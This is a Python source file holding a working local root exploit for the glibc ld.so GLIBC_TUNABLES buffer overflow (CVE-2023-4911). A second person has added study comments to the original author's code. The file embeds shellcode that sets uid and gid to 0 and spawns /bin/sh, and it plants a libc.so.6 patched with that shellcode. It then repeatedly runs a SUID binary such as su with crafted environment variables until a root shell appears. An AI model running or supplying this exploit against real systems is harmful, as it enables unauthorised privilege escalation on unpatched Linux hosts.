# This code is written by blasty <peter@haxx.in>, I just commented it to figure it out
# ORIGINAL POC SCRIPT -> https://haxx.in/files/gnu-acme.py

import binascii
import resource
import struct
import select
import time

import sys
import os

from ctypes import *
from ctypes.util import find_library
from shutil import which

unhex = lambda v: binascii.unhexlify(v.replace(" ", ""))

ARCH = {
    "x86_64": {
        "shellcode": unhex(
            "31ff6a69580f0531ff6a6a580f056a6848b82f62696e2f2f2f73504889e768726901018134240101010131f6566a085e4801e6564889e631d26a3b580f05"
        ),  # MODIFIED: context.arch = 'amd64'; asm(shellcraft.setuid(0) + shellcraft.setgid(0) + shellcraft.sh()).hex()
        "exitcode": unhex("6a665f6a3c580f05"),  # asm(shellcraft.exit(0x66)).hex()
        "stack_top": 0x800000000000,
        "stack_aslr_bits": 30,  # https://www.researchgate.net/figure/Comparative-summary-of-bits-of-entropy_tbl3_334618410
    }
}

# shellcode
#    0:   31 ff                   xor    edi, edi
#    2:   6a 69                   push   0x69
#    4:   58                      pop    rax
#    5:   0f 05                   syscall
#    7:   31 ff                   xor    edi, edi
#    9:   6a 6a                   push   0x6a
#    b:   58                      pop    rax
#    c:   0f 05                   syscall
#    e:   6a 68                   push   0x68
#   10:   48 b8 2f 62 69 6e 2f 2f 2f 73   movabs rax, 0x732f2f2f6e69622f
#   1a:   50                      push   rax
#   1b:   48 89 e7                mov    rdi, rsp
#   1e:   68 72 69 01 01          push   0x1016972
#   23:   81 34 24 01 01 01 01    xor    DWORD PTR [rsp], 0x1010101
#   2a:   31 f6                   xor    esi, esi
#   2c:   56                      push   rsi
#   2d:   6a 08                   push   0x8
#   2f:   5e                      pop    rsi
#   30:   48 01 e6                add    rsi, rsp
#   33:   56                      push   rsi
#   34:   48 89 e6                mov    rsi, rsp
#   37:   31 d2                   xor    edx, edx
#   39:   6a 3b                   push   0x3b
#   3b:   58                      pop    rax
#   3c:   0f 05                   syscall

# exitcode
#    0:   6a 66                   push   0x66
#    2:   5f                      pop    rdi
#    3:   6a 3c                   push   0x3c
#    5:   58                      pop    rax
#    6:   0f 05                   syscall

TARGETS = {
    "e664396d7c25533074698a0695127259dbbf56f3": 568
}

libc = cdll.LoadLibrary("libc.so.6")
libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)
resource.setrlimit(
    resource.RLIMIT_STACK, (resource.RLIM_INFINITY, resource.RLIM_INFINITY)
)


def error(s):
    print("error: %s" % s)
    exit(-1)


def find_hax_path(blob, offset):
    pos = offset
    while pos > 0:
        if blob[pos] != 0 and blob[pos] != 0x2F and blob[pos + 1] == 0:
            return {"path": bytes([blob[pos]]), "offset": pos - offset}
        pos = pos - 1
    return None


def lolstruct(format, keys, data):
    return dict(zip(keys.split(" "), struct.unpack(format, data)))

# find libc path
def lib_path(libname):
    class LINKMAP(Structure):
        _fields_ = [("l_addr", c_void_p), ("l_name", c_char_p)]

    lib = CDLL(find_library("c"))
    libdl = CDLL(find_library("dl"))
    dlinfo = libdl.dlinfo
    dlinfo.argtypes = c_void_p, c_int, c_void_p
    dlinfo.restype = c_int
    lmptr = c_void_p()
    dlinfo(lib._handle, 2, byref(lmptr))
    return cast(lmptr, POINTER(LINKMAP)).contents.l_name


def execve(filename, cargv, cenvp):
    libc.execve(filename, cargv, cenvp)


def spawn(filename, argv, envp):
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)
    # execve(filename, cargv, cenvp)
    # exit(0)

    child_pid = os.fork()

    # child
    if not child_pid:
        execve(filename, cargv, cenvp)
        exit(0)

    # parent
    start_time = time.time()
    while True:
        try:
            pid, status = os.waitpid(child_pid, os.WNOHANG)
            if pid == child_pid:
                if os.WIFEXITED(status):
                    return os.WEXITSTATUS(status) & 0xFF7F
                else:
                    return 0
        except:
            pass
        current_time = time.time()
        if current_time - start_time >= 1.5:
            print("** ohh... looks like we got a shell? **\n")
            os.waitpid(child_pid, 0)
            return 0x1337


class lazy_elf:
    def __init__(self, filename):
        self.d = open(filename, "rb").read()
        self.bits = 64 if self.d[4] == 2 else 32

        eh_size = 0x30 if self.bits == 64 else 0x24

        self.h = lolstruct(
            "<HHLQQQLHHHHHH" if self.bits == 64 else "<HHLLLLLHHHHHH",
            "type machine version entry phoff shoff flags ehsize "
            + "phtentsize phnum shentsize shnum shstrndx",
            self.d[0x10 : 0x10 + eh_size],
        )
        shstr = self.shdr(self.h["shstrndx"])
        self.section_names = self.d[shstr["offset"] : shstr["offset"] + shstr["size"]]

    def shdr(self, idx):
        pos = self.h["shoff"] + (idx * self.h["shentsize"])
        return lolstruct(
            "<LLQQQQLLQQ" if self.bits == 64 else "<LLLLLLLLLL",
            "name type flags addr offset size link info addralign entsize",
            self.d[pos : pos + self.h["shentsize"]],
        )

    # find offset of section
    def shdr_by_name(self, name):
        name = name.encode()
        for i in range(self.h["shnum"]):
            shdr = self.shdr(i)
            if self.section_names[shdr["name"] :].split(b"\x00")[0] == name:
                return shdr
        return None

    def section_by_name(self, name):
        s = self.shdr_by_name(name)
        return self.d[s["offset"] : s["offset"] + s["size"]]

    def symbol(self, name):
        name = name.encode()
        dynsym = self.section_by_name(".dynsym")
        dynstr = self.section_by_name(".dynstr")
        sym_size = 24 if self.bits == 64 else 16
        for i in range(len(dynsym) // sym_size):
            pos = i * sym_size
            if self.bits == 64:
                sym = lolstruct(
                    "<LBBHQQ",
                    "name info other shndx value size",
                    dynsym[pos : pos + sym_size],
                )
            else:
                sym = lolstruct(
                    "<LLLBBH",
                    "name value size info other shndx",
                    dynsym[pos : pos + sym_size],
                )
            if dynstr[sym["name"] :].split(b"\x00")[0] == name:
                return sym["value"]
        return None


def is_aslr_enabled():
    return int(open("/proc/sys/kernel/randomize_va_space", "r").read()) > 0


def build_env(adjust, addr, offset, bits=64):  # TARGETS[ld_build_id], stack_addr, hax_path["offset"], suid_e.bits
    # heap meh shui
    if bits == 64:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 8,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"Y" * 24,
        ]

        pad = 172
        fill = 47
    else:
        env = [
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"P" * adjust,
            b"GLIBC_TUNABLES=glibc.mem.tagging=glibc.mem.tagging=" + b"X" * 7,
            b"GLIBC_TUNABLES=glibc.mem.tagging=" + b"X" * 14,
        ]

        pad = 87
        fill = 47 * 2

    for j in range(pad):
        env.append(b"")

    if bits == 64:
        env.append(struct.pack("<Q", addr))
        env.append(b"")
    else:
        env.append(struct.pack("<L", addr))

    for i in range(384):
        env.append(b"")

    for i in range(fill):
        if bits == 64:
            env.append(
                struct.pack("<Q", offset & 0xFFFFFFFFFFFFFFFF) * 16382 + b"\xaa" * 7
            )
        else:
            env.append(struct.pack("<L", offset & 0xFFFFFFFF) * 16382 + b"\xaa" * 7)

    env.append(None)
    return env


def build_argv(args):
    argv = []
    for arg in args:
        if len(argv) == 0:
            arg = os.path.basename(arg)
        argv.append(arg.encode())
    argv.append(None)
    return argv


def banner():
    print("")
    print("      $$$ glibc ld.so (CVE-2023-4911) exploit $$$")
    print("            -- by blasty <peter@haxx.in> --      ")
    print("")


if __name__ == "__main__":
    banner()  # just print bunner

    machine = os.uname().machine  # uname of machine

    if machine not in ARCH.keys():
        error("architecture '%s' not supported" % machine)

    print("[i] libc = %s" % lib_path("c").decode())  # print libc path

    if len(sys.argv) == 1:  # check if user pass SUID binary as args, if no use "su" binary
        suid_path = which("su")
        suid_args = ["--help"]
    else:
        suid_path = sys.argv[1]
        suid_args = sys.argv[2:]

    lsb = ((0x100 - (len(suid_path) + 1 + 8)) & 7) + 8  # ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????

    print(f"[DEBUG] -> LSB: {lsb}")

    print("[i] suid target = %s, suid_args = %s" % (suid_path, suid_args))  # print suid binary path with args

    suid_e = lazy_elf(suid_path)  # generate lazy_elf object with SUID binary

    ld_path = suid_e.section_by_name(".interp").strip(b"\x00").decode()  # get ld_path from suid binary .interp section

    ld_e = lazy_elf(ld_path)   # generate lazy_elf object with ld.so binary

    print("[i] ld.so = %s" % ld_path)  # print ld.so path

    ld_build_id = binascii.hexlify(  # get ld.so build id from ".note.gnu.build-id" section
        ld_e.section_by_name(".note.gnu.build-id")[-20:]
    ).decode()

    print("[i] ld.so build id = %s" % ld_build_id)  # print ld.so build id

    libc_e = lazy_elf(lib_path("c"))    # generate lazy_elf object with libc.so.6 binary

    __libc_start_main = libc_e.symbol("__libc_start_main")  # find offset of __libc_start_main function in libc

    if __libc_start_main == None:  # if can't find __libc_start_main
        error("could not resolve __libc_start_main")

    print("[i] __libc_start_main = 0x%x" % __libc_start_main)  # print offset of __libc_start_main

    offset = suid_e.shdr_by_name(".dynstr")["offset"]  # Find offset of .dynstr section
    print(f"[DEBUG] -> .DYNSTR offset: {offset}")
    hax_path = find_hax_path(suid_e.d, offset)  # find value and offset in .dynstr to make trusted folder. It will be "\x08" at offset -8 ( [.dynstr - 8] )
    if hax_path is None:  #  error if not find hax
        error("could not find hax path")

    print(  # print hax
        "[i] using hax path %s at offset %d"
        % (
            hax_path["path"],
            hax_path["offset"],
        )
    )

    if not os.path.exists(hax_path["path"]):  # create folder ("\x08" to place libc there later)
        os.mkdir(hax_path["path"])

    argv = build_argv([suid_path] + suid_args)  # just get array of arguments ( ["su", "--help", None] )

    shellcode = (  # get shellcode (to spawn /bin/sh) or get exitcode which returns 0x66 if executed
        ARCH[machine]["shellcode"] if is_aslr_enabled() else ARCH[machine]["exitcode"]
    )

    with open(hax_path["path"] + b"/libc.so.6", "wb") as fh:  # open folder "\x08" and write patched (with shellcode) libc.so.6 there
        fh.write(libc_e.d[0:__libc_start_main])  # all before __libc_start_main
        fh.write(shellcode)  # shellcode
        fh.write(libc_e.d[__libc_start_main + len(shellcode) :])  # all after shellcode
    print("[i] wrote patched libc.so.6")

    if not is_aslr_enabled():  # if ASLR is not enabled
        print("[i] ASLR is not enabled, attempting to find usable offsets")

        stack_addr = ARCH[machine]["stack_top"] - 0x1F00
        stack_addr += lsb

        print("[i] using stack addr 0x%x" % stack_addr)

        for adjust in range(128, 1024):
            env = build_env(adjust, stack_addr, hax_path["offset"], suid_e.bits)
            r = spawn(suid_path.encode(), argv, env)
            if r == 0x66:
                print(
                    "found working offset for ld.so '%s' -> %d" % (ld_build_id, adjust)
                )

    else:
        if ld_build_id not in TARGETS.keys():  # check if ld.so build id in TARGET list (check if we know ofsset to overflow)
            error("no target info found for build id %s" % ld_build_id)

        stack_addr = ARCH[machine]["stack_top"] - (  # calculate minimum address of stack
            1 << (ARCH[machine]["stack_aslr_bits"] - 1)
        )
        # In [11]: hex(1 << 29)
        # Out[11]: '0x20000000'

        # In [12]: hex(0x800000000000 - 0x20000000)
        # Out[12]: '0x7fffe0000000'

        print(f"[DEBUG] -> STACK ADDR: {hex(stack_addr)}")
        stack_addr += lsb
        # avoid NULL bytes in guessy addr (out of sheer laziness really)
        for i in range(6 if suid_e.bits == 64 else 4):  # some calculations to find usable offset in stack
            if (stack_addr >> (i * 8)) & 0xFF == 0:
                stack_addr |= 0x10 << (i * 8)

        print("[i] using stack addr 0x%x" % stack_addr)

        env = build_env(  # create malicious environment variables (with overflow and stack overwrite)
            TARGETS[ld_build_id], stack_addr, hax_path["offset"], suid_e.bits
        )

        # print(f"[DEBUG] -> ENV: {env}")

        cnt = 1
        while True:
            if cnt % 0x10 == 0:  # print "." every 10 executions
                sys.stdout.write(".")
                sys.stdout.flush()
            if spawn(suid_path.encode(), argv, env) == 0x1337:  # spawn process of SUID with malicious environment variables
                print("goodbye. (took %d tries)" % cnt)
                exit(0)
            cnt += 1
